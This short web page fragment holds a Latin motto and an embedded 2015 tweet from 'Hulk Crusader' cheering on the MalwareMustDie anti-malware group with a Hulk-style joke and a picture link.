*Non Misericordias Super Iniquos*  

<blockquote class="twitter-tweet" lang="de"><p lang="en" dir="ltr"><p lang="en" dir="ltr"><a href="https://twitter.com/MalwareMustDie">@MalwareMustDie</a> <a href="https://twitter.com/wirehack7">@wirehack7</a> <a href="https://twitter.com/WhitePacket">@WhitePacket</a> Hulk like when puny moronz feel the pain of <a href="https://twitter.com/hashtag/MalwareMustDie?src=hash">#MalwareMustDie</a> RAAAAAARGHHH!!!! <a href="http://t.co/itai6JNTpc">pic.twitter.com/itai6JNTpc</a></p>&mdash; Hulk Crusader (@Hulk_Crusader) <a href="https://twitter.com/Hulk_Crusader/status/645344109524226048">19. September 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>